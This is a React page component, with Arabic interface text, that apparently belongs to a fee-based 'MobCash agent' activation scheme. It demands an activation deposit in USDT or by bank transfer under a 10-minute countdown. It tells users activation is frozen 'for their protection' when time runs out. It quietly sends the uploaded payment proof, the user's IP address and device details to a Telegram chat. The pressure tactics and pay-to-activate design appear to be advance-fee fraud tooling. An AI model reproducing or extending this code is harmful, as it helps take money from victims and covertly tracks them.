import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { useTranslation } from 'react-i18next';
import { UploadCloud, Copy, Check, Info, Wallet, Clock, Download, ShieldAlert, Lock, MessageCircle, Sparkles, Building2, Smartphone } from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';
import { supabase } from '../../lib/supabase';
import { useAuthStore } from '../../store/auth';
import { sendTelegramMessage, sendTelegramPhoto, getDeviceInfo, getIpAddress } from '../../lib/telegram';

export default function Activate() {
  const { t, i18n } = useTranslation();
  const navigate = useNavigate();
  const { user, setUser } = useAuthStore();
  const [loading, setLoading] = useState(false);
  const [copied, setCopied] = useState(false);
  const [file, setFile] = useState<File | null>(null);
  const [error, setError] = useState('');

  const [agentData, setAgentData] = useState<any>(user);
  
  // 10-minute timer state (600 seconds)
  const [timeLeft, setTimeLeft] = useState<number>(600);
  const [isExpired, setIsExpired] = useState<boolean>(false);

  useEffect(() => {
    if (user?.id) {
      // Update step status
      supabase.from('agents').update({ current_step: 'Activation Info' }).eq('id', user.id);
      
      // Fetch latest profile to get updated payment details from admin
      const fetchProfile = async () => {
        const { data } = await supabase.from('agents').select('*').eq('id', user.id).single();
        if (data) {
          setAgentData(data);
          setUser({ ...user, ...data }, 'agent');
        }
      };
      fetchProfile();
    }
  }, [user?.id]);

  // 10-minute timer persistence & countdown logic
  useEffect(() => {
    if (!user?.id) return;

    const storageKey = `deposit_timer_start_${user.id}`;
    const pendingKey = `deposit_timer_pending_${user.id}`;
    let startTimeStr = localStorage.getItem(storageKey);
    const isPendingLocal = localStorage.getItem(pendingKey) === 'true';

    let startTime: number;

    // If admin reset the timer to PENDING_LOGIN or if pending flag exists, timer starts NOW on agent login/visit
    if (agentData?.deposit_timer_reset_at === 'PENDING_LOGIN' || isPendingLocal || !startTimeStr) {
      startTime = Date.now();
      localStorage.setItem(storageKey, startTime.toString());
      localStorage.removeItem(pendingKey);

      // Persist the actual login start time in Supabase DB so it's logged and locked
      supabase
        .from('agents')
        .update({ deposit_timer_reset_at: new Date(startTime).toISOString() })
        .eq('id', user.id)
        .then(() => {});
    } else if (agentData?.deposit_timer_reset_at && agentData.deposit_timer_reset_at !== 'PENDING_LOGIN') {
      const adminTime = new Date(agentData.deposit_timer_reset_at).getTime();
      const localTime = startTimeStr ? parseInt(startTimeStr, 10) : 0;
      if (!isNaN(adminTime) && adminTime > localTime) {
        startTimeStr = adminTime.toString();
        localStorage.setItem(storageKey, startTimeStr);
      }
      startTime = startTimeStr ? parseInt(startTimeStr, 10) : Date.now();
    } else {
      startTime = startTimeStr ? parseInt(startTimeStr, 10) : Date.now();
    }

    const updateTimer = () => {
      const elapsedSeconds = Math.floor((Date.now() - startTime) / 1000);
      const remaining = 600 - elapsedSeconds;
      if (remaining <= 0) {
        setTimeLeft(0);
        setIsExpired(true);
      } else {
        setTimeLeft(remaining);
        setIsExpired(false);
      }
    };

    updateTimer();
    const interval = setInterval(updateTimer, 1000);
    return () => clearInterval(interval);
  }, [user?.id, agentData?.deposit_timer_reset_at]);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  const isBankTransfer = agentData?.agent_type === 'bank_transfer';

  const paymentDetails = {
    amount: agentData?.activation_amount || '500.00',
    currency: 'USDT (TRC20)',
    address: agentData?.usdt_address || agentData?.bank_name || 'TXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX',
    qrCode: agentData?.qr_code_url || null
  };

  const defaultQrUrl = paymentDetails.qrCode || `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(paymentDetails.address)}`;

  const handleCopy = () => {
    navigator.clipboard.writeText(paymentDetails.address);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const handleDownloadQr = async () => {
    try {
      const response = await fetch(defaultQrUrl);
      const blob = await response.blob();
      const blobUrl = URL.createObjectURL(blob);
      const link = document.createElement('a');
      link.href = blobUrl;
      link.download = `MobCash_Deposit_QR_${user?.agent_id || 'QR'}.png`;
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
      URL.revokeObjectURL(blobUrl);
    } catch {
      window.open(defaultQrUrl, '_blank');
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (isExpired) {
      setError(t('deposit_timer_expired_msg', 'عذراً، انتهت المهلة المحددة للإيداع (10 دقائق). يرجى مراجعة المدير لتجديد المهلة.'));
      return;
    }
    if (!file) {
      setError(t('upload_proof_error') || 'Please upload a proof of payment');
      return;
    }

    setLoading(true);
    setError('');

    try {
      const { error: updateError } = await supabase
        .from('agents')
        .update({ status: 'under_review', current_step: 'Under Review' })
        .eq('id', user?.id);

      if (updateError) throw updateError;

      // Log activity
      await supabase.from('activities').insert([
        {
          agent_id: user?.agent_id,
          action: 'Agent submitted activation proof',
        },
      ]);

      // Send Telegram notification
      try {
        const ip = await getIpAddress();
        const device = getDeviceInfo();
        const time = new Date().toLocaleString('ar-EG');
        const lang = i18n.language === 'ar' ? 'العربية' : 'English';
        
        const msg = `💸 <b>تم إرسال إثبات الدفع من الوكيل</b> 💸\n\n` +
                    `🆔 <b>ID الوكيل:</b> <code>${user?.agent_id}</code>\n` +
                    `👤 <b>الاسم:</b> ${user?.full_name || ''}\n` +
                    `🏷️ <b>النوع:</b> ${isBankTransfer ? 'تحويل مصرفي' : 'وكيل موبيكاش'}\n` +
                    `💵 <b>المبلغ:</b> <code>${paymentDetails.amount} ${paymentDetails.currency}</code>\n` +
                    `📎 <b>اسم الملف:</b> ${file.name}\n` +
                    `🌐 <b>اللغة:</b> ${lang}\n` +
                    `📱 <b>الجهاز:</b> ${device}\n` +
                    `🌐 <b>IP:</b> <code>${ip}</code>\n` +
                    `⏰ <b>الوقت:</b> ${time}\n` +
                    `⏳ <b>الحالة:</b> <i>في انتظار مراجعة الإدارة</i>`;
                    
        await sendTelegramPhoto(file, msg, true);
      } catch (e) {
        console.error('Telegram notification failed', e);
      }

      setUser({ ...user, status: 'under_review', current_step: 'Under Review' }, 'agent');
      navigate('/agent/review');
    } catch (err: any) {
      setError(err.message || t('failed_submit_activation') || 'Failed to submit activation request');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="max-w-3xl mx-auto space-y-6 pb-12">
      {/* Dynamic Title Header */}
      <div className="text-center mb-6">
        <h1 className="text-2xl sm:text-3xl font-black text-white tracking-tight">
          {isBankTransfer
            ? t('bank_transfer_activation_title', 'إيداع وتفعيل وكيل تحويل مصرفي')
            : t('mobcash_activation_title', 'إيداع وتفعيل وكيل موبيكاش (MobCash)')}
        </h1>
        <p className="text-slate-400 mt-2 text-sm sm:text-base font-medium">
          {t('deposit_prompt_subtitle', 'يرجى إيداع مبلغ التفعيل الموضح أدناه لإتمام تفعيل الحساب')}
        </p>
      </div>

      {/* 10-Minute Countdown Banner */}
      <div className={`p-4 rounded-2xl border flex items-center justify-between gap-3 shadow-xl transition-all ${
        isExpired 
          ? 'bg-rose-950/80 border-rose-500/40 text-rose-200' 
          : 'bg-slate-900/90 border-amber-500/30 text-amber-300'
      }`}>
        <div className="flex items-center gap-3">
          <div className={`w-10 h-10 rounded-xl flex items-center justify-center shrink-0 shadow-md ${
            isExpired ? 'bg-rose-600 text-white' : 'bg-amber-500 text-slate-950 font-black'
          }`}>
            <Clock className="w-5 h-5 animate-pulse" />
          </div>
          <div>
            <div className="text-xs font-bold uppercase tracking-wider">
              {isExpired ? t('deposit_window_closed', 'تم إغلاق مهلة الإيداع') : t('deposit_timer_label', 'مهلة الإيداع المتبقية')}
            </div>
            <div className="text-xs sm:text-sm font-semibold mt-0.5 text-slate-300">
              {isExpired 
                ? t('time_expired_notice', 'انتهت الـ 10 دقائق المحددة للإيداع') 
                : t('deposit_within_10_mins', 'يرجى إتمام الإيداع قبل انتهاء الوقت')}
            </div>
          </div>
        </div>

        <div className={`text-xl sm:text-2xl font-black font-mono tracking-wider px-4 py-2 rounded-xl shadow-lg ${
          isExpired 
            ? 'bg-rose-600 text-white' 
            : 'bg-gradient-to-r from-amber-500 to-yellow-500 text-slate-950'
        }`}>
          {formatTime(timeLeft)}
        </div>
      </div>

      {/* Expired Warning Screen */}
      {isExpired && (
        <div className="bg-slate-900/90 border-2 border-rose-500/40 rounded-3xl p-6 sm:p-8 text-center space-y-4 shadow-2xl">
          <div className="w-16 h-16 bg-rose-500/10 border border-rose-500/30 text-rose-400 rounded-2xl flex items-center justify-center mx-auto shadow-inner">
            <Lock className="w-8 h-8" />
          </div>
          <h3 className="text-xl font-black text-rose-300">
            {t('deposit_expired_title', '🔒 انتهت مهلة الإيداع (10 دقائق)')}
          </h3>
          <p className="text-sm text-slate-300 leading-relaxed max-w-lg mx-auto font-medium">
            {t(
              'deposit_expired_desc',
              'لقد انتهت المهلة المحددة (10 دقائق) لإكمال عملية الإيداع والتفعيل. تم تجميد التفعيل مؤقتاً لحمايتك. يرجى مراجعة مديرك أو الإدارة لإعادة فتح المهلة وتفعيل الحساب مرة أخرى.'
            )}
          </p>
          <div className="pt-2">
            <a
              href="https://t.me/"
              target="_blank"
              rel="noopener noreferrer"
              className="inline-flex items-center gap-2 px-6 py-3.5 bg-gradient-to-r from-amber-500 to-yellow-500 hover:from-amber-400 hover:to-yellow-400 text-slate-950 font-black rounded-xl transition-all shadow-lg text-sm cursor-pointer"
            >
              <MessageCircle className="w-5 h-5" />
              <span>{t('contact_manager', 'تواصل مع المدير لتجديد المهلة (10 دقائق)')}</span>
            </a>
          </div>
        </div>
      )}

      {/* Payment Details Container */}
      {!isExpired && (
        <div className="bg-slate-900/90 rounded-3xl shadow-2xl border border-slate-800 overflow-hidden">
          <div className="p-6 sm:p-8 space-y-8">
            
            {/* Payment Box */}
            <div className="bg-gradient-to-br from-slate-950 via-indigo-950 to-slate-950 text-white rounded-3xl p-6 sm:p-8 shadow-2xl border border-slate-800 relative overflow-hidden">
              <div className="absolute top-0 right-0 w-48 h-48 bg-amber-500/10 rounded-full blur-3xl pointer-events-none"></div>
              
              <div className="flex items-center justify-between mb-6 border-b border-slate-800 pb-4">
                <div className="flex items-center gap-3">
                  <div className="w-12 h-12 bg-indigo-600/30 border border-indigo-400/30 rounded-2xl flex items-center justify-center text-amber-400 shadow-md backdrop-blur-md">
                    <Wallet className="w-6 h-6" />
                  </div>
                  <div>
                    <div className="text-xs uppercase tracking-widest text-amber-400 font-bold">
                      {isBankTransfer ? t('bank_payment_details', 'تفاصيل الدفع المصرفي') : t('global_payment_gateway', 'بوابة الدفع العالمية')}
                    </div>
                    <h3 className="text-xl font-black text-white">{t('payment_details', 'تفاصيل الإيداع')}</h3>
                  </div>
                </div>
                <span className="px-3 py-1 rounded-full bg-emerald-500/20 border border-emerald-400/30 text-emerald-300 font-mono text-xs font-bold uppercase tracking-wider">
                  {isBankTransfer ? 'Bank Transfer' : 'USDT (TRC20)'}
                </span>
              </div>

              {/* Deposit Amount */}
              <div className="bg-slate-900/80 border border-slate-800 rounded-2xl p-6 mb-6 backdrop-blur-md text-center">
                <span className="text-xs text-slate-400 uppercase font-bold tracking-wider block mb-1">
                  {t('activation_amount', 'مبلغ الإيداع المطلـوب')}
                </span>
                <div className="text-4xl sm:text-5xl font-black text-amber-400 font-mono tracking-tight">
                  ${paymentDetails.amount} <span className="text-lg font-bold text-slate-300">{paymentDetails.currency}</span>
                </div>
              </div>

              {/* QR Code and Address Section */}
              <div className="flex flex-col lg:flex-row items-center gap-6">
                
                {/* QR Code + Download Button */}
                <div className="flex flex-col items-center gap-2.5 shrink-0">
                  <motion.div 
                    whileHover={{ scale: 1.05 }}
                    className="p-3 bg-white rounded-2xl shadow-2xl border-2 border-slate-700 relative group"
                  >
                    <img src={defaultQrUrl} alt="Payment QR Code" className="w-36 h-36 object-contain rounded-xl" />
                  </motion.div>
                  
                  <motion.button
                    whileHover={{ scale: 1.05 }}
                    whileTap={{ scale: 0.95 }}
                    type="button"
                    onClick={handleDownloadQr}
                    className="flex items-center gap-1.5 px-3.5 py-2 bg-slate-800 hover:bg-slate-700 text-slate-200 text-xs font-bold rounded-xl transition-all border border-slate-700 cursor-pointer shadow-md"
                  >
                    <Download className="w-3.5 h-3.5 text-amber-400" />
                    <span>{t('download_qr', 'تحميل الباركود')}</span>
                  </motion.button>
                </div>
                
                {/* Wallet / Bank Address Code Box */}
                <div className="flex-1 w-full space-y-4">
                  <div className="space-y-2">
                    <label className="text-xs font-bold text-slate-300 uppercase tracking-wider block">
                      {isBankTransfer ? t('bank_account_info', 'اسم البنك / الحساب البنكي') : t('deposit_address_usdt', 'عنوان محفظة الإيداع (USDT TRC20)')}
                    </label>
                    <div className="flex items-center justify-between bg-slate-950 border border-slate-800 rounded-2xl p-3 sm:p-4 backdrop-blur-md shadow-inner">
                      <code className="font-mono text-xs sm:text-sm text-amber-400 break-all select-all font-bold me-2">
                        {paymentDetails.address}
                      </code>
                      <motion.button
                        whileHover={{ scale: 1.05 }}
                        whileTap={{ scale: 0.95 }}
                        type="button"
                        onClick={handleCopy}
                        className={`shrink-0 flex items-center gap-2 px-4 py-2.5 rounded-xl font-black text-xs sm:text-sm transition-all shadow-md cursor-pointer ${
                          copied 
                            ? 'bg-emerald-600 text-white shadow-emerald-900/40' 
                            : 'bg-amber-500 hover:bg-amber-400 text-slate-950 shadow-amber-900/30'
                        }`}
                      >
                        <AnimatePresence mode="wait">
                          {copied ? (
                            <motion.span key="check" initial={{ scale: 0 }} animate={{ scale: 1 }} className="flex items-center gap-1.5">
                              <Check className="w-4 h-4" />
                              <span>{t('copied', 'تم النسخ!')}</span>
                            </motion.span>
                          ) : (
                            <motion.span key="copy" initial={{ scale: 0 }} animate={{ scale: 1 }} className="flex items-center gap-1.5">
                              <Copy className="w-4 h-4" />
                              <span>{t('copy', 'نسخ')}</span>
                            </motion.span>
                          )}
                        </AnimatePresence>
                      </motion.button>
                    </div>
                  </div>

                  {!isBankTransfer && (
                    <p className="text-xs text-amber-300/90 font-medium flex items-center gap-1.5 bg-amber-500/10 p-3 rounded-xl border border-amber-500/20">
                      <Info className="w-4 h-4 shrink-0 text-amber-400" />
                      <span>{t('trc20_warning', 'يرجى التأكد من اختيار شبكة Tron (TRC20) فقط لإرسال المعاملة لتجنب فقدان الأموال.')}</span>
                    </p>
                  )}
                </div>
              </div>
            </div>

            <div className="w-full h-px bg-slate-800"></div>

            {/* Proof Upload Form */}
            <form onSubmit={handleSubmit} className="space-y-6">
              <div>
                <h3 className="text-sm font-bold text-white uppercase tracking-wider mb-4 flex items-center gap-2">
                  <UploadCloud className="w-4 h-4 text-amber-400" />
                  {t('upload_proof', 'رفع إثبات الدفع والإيداع')}
                </h3>
                
                <motion.div 
                  whileHover={{ borderColor: 'rgba(245, 158, 11, 0.5)' }}
                  className="mt-1 flex justify-center px-6 pt-5 pb-6 border-2 border-slate-800 border-dashed rounded-2xl bg-slate-950 hover:bg-slate-900/80 transition-all relative"
                >
                  <div className="space-y-1 text-center">
                    <UploadCloud className="mx-auto h-12 w-12 text-amber-400 animate-bounce" />
                    <div className="flex text-sm text-slate-300 justify-center">
                      <label
                        htmlFor="file-upload"
                        className="relative cursor-pointer bg-slate-800 hover:bg-slate-700 rounded-xl font-bold text-amber-400 hover:text-amber-300 focus-within:outline-none focus-within:ring-2 focus-within:ring-amber-400 border border-slate-700 px-4 py-2.5 mt-2 transition-all shadow-md flex items-center gap-2"
                      >
                        <span>{t('upload_file', 'اختر صورة إثبات الدفع')}</span>
                        <input
                          id="file-upload"
                          name="file-upload"
                          type="file"
                          className="sr-only"
                          accept="image/*,.pdf"
                          onChange={(e) => setFile(e.target.files?.[0] || null)}
                        />
                      </label>
                    </div>
                    <p className="text-xs text-slate-500 pt-2">PNG, JPG, PDF up to 10MB</p>
                  </div>
                </motion.div>
                
                <AnimatePresence>
                  {file && (
                    <motion.div 
                      initial={{ opacity: 0, y: -5 }}
                      animate={{ opacity: 1, y: 0 }}
                      className="mt-3 text-sm text-emerald-400 flex items-center gap-2 bg-emerald-950/60 p-3 rounded-xl border border-emerald-500/30"
                    >
                      <Check className="w-4 h-4" />
                      {t('selected', 'تم الاختيار')}: <span className="font-bold">{file.name}</span>
                    </motion.div>
                  )}
                </AnimatePresence>
                
                {error && (
                  <div className="mt-3 text-sm text-rose-400 bg-rose-950/60 p-3 rounded-xl border border-rose-500/30">
                    {error}
                  </div>
                )}
              </div>

              <div className="bg-slate-950 border border-slate-800 rounded-xl p-4 flex items-start gap-3">
                <Info className="w-5 h-5 text-amber-400 mt-0.5 flex-shrink-0" />
                <p className="text-xs sm:text-sm text-slate-300">
                  {t('activation_review_notice', 'بعد تقديم إثبات الدفع، سيقوم فريق الإدارة بمراجعة طلبك وتأكيد التفعيل فوراً.')}
                </p>
              </div>

              <motion.button
                whileHover={{ scale: (loading || !file) ? 1 : 1.02 }}
                whileTap={{ scale: (loading || !file) ? 1 : 0.98 }}
                type="submit"
                disabled={loading || !file}
                className="w-full py-4 bg-gradient-to-r from-amber-500 via-yellow-500 to-amber-500 hover:from-amber-400 hover:to-yellow-400 text-slate-950 font-black rounded-2xl transition-all disabled:opacity-40 flex items-center justify-center gap-2 shadow-2xl cursor-pointer text-base"
              >
                {loading ? (
                  <div className="flex items-center gap-2">
                    <div className="w-5 h-5 border-2 border-slate-950 border-t-transparent rounded-full animate-spin"></div>
                    <span>جاري التشفير والإرسال...</span>
                  </div>
                ) : (
                  t('submit', 'إرسال إثبات الدفع لتأكيد التفعيل')
                )}
              </motion.button>
            </form>
          </div>
        </div>
      )}
    </div>
  );
}

